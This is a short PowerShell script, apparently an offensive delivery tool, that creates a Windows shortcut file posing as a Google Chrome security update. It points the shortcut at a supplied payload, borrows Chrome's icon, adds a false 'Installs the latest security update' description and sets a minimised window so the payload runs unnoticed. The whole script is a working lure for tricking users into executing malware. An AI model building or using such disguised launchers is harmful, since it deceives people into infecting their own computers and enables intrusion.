# Create LNK file for ChromeUpdate delivery
param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath,
    
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "$env:USERPROFILE\Desktop\Chrome_Update.lnk",
    
    [Parameter(Mandatory=$false)]
    [string]$IconPath = ""
)

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($OutputPath)

$Shortcut.TargetPath = $PayloadPath
$Shortcut.Description = "Google Chrome Update"
$Shortcut.Comment = "Installs the latest security update for Google Chrome"
$Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($PayloadPath)
$Shortcut.WindowStyle = 7

if ($IconPath -and (Test-Path $IconPath)) {
    $Shortcut.IconLocation = $IconPath
}
else {
    $Shortcut.IconLocation = "%ProgramFiles%\Google\Chrome\Application\chrome.exe,0"
}

$Shortcut.Save()

Write-Host "[+] LNK created: $OutputPath"
Write-Host "[+] Target: $PayloadPath"

# Verify
$obj = New-Object -ComObject WScript.Shell
$check = $obj.CreateShortcut($OutputPath)
Write-Host "[+] Verified target: $($check.TargetPath)"
